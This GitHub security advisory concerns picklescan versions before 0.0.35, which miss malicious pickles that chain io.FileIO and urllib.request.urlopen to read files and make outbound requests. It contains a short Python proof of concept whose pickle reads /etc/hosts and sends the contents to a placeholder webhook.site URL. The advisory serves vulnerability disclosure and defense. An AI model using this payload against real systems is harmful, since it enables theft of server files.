# [H] picklescan has Arbitrary file read using `io.FileIO` 

## Summary
Severity: High
Advisory: GHSA-9726-w42j-3qjr
CVE: CVE-2026-53872
CWE: CWE-22, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-08
Source: https://github.com/advisories/GHSA-9726-w42j-3qjr
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.35

## Details
### Summary
Unsafe pickle deserialization allows unauthenticated attackers to read arbitrary server files and perform SSRF. By chaining io.FileIO and urllib.request.urlopen, an attacker can bypass RCE-focused blocklists to exfiltrate sensitive data (example: /etc/passwd) to an external server.

### Details
The application deserializes untrusted pickle data. While RCE keywords (os, exec) may be blocked, the exploit abuses standard library features:

1. io.FileIO: Opens local files without using builtins.open.

2. urllib.request.urlopen: Accepts the file object as an iterable body for a POST request.

3. Data Exfiltration: The file content is streamed directly to an attacker-controlled URL during unpickling.

### PoC

```python
import pickle, io, urllib.request

class GetFile:
    def __reduce__(self):
        return (io.FileIO, ('/etc/hosts', 'r'))

class Exfiltrate:
    def __reduce__(self):
        return (urllib.request.urlopen, ('https://webhook.site/YOUR_UUID_HERE', GetFile()))

with open("bypass_http.pkl", "wb") as f:
    pickle.dump(Exfiltrate(), f)
```

<img width="650" height="114" alt="Screenshot 2025-12-30 at 10 13 14 PM" src="https://github.com/user-attachments/assets/4edf9640-80f6-4701-ae87-cff1079e2994" />


### Impact

- Arbitrary file read

Thanks for this library and your time. If you think `picklescan` is focused on detecting only `RCE` kind of vulnerabilities rather adding `File IO`, `Http` or any protocol based may cause lot of noise, feel free to close this issue.

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr
- https://nvd.nist.gov/vuln/detail/CVE-2026-53872
- https://github.com/mmaitre314/picklescan/pull/55
- https://github.com/mmaitre314/picklescan/commit/a01c58d5dd7960db557b849817c0ab83ab111ef1
- https://github.com/mmaitre314/picklescan
- https://github.com/mmaitre314/picklescan/releases/tag/v0.0.35
- https://www.vulncheck.com/advisories/picklescan-arbitrary-file-read-via-unsafe-pickle-deserialization
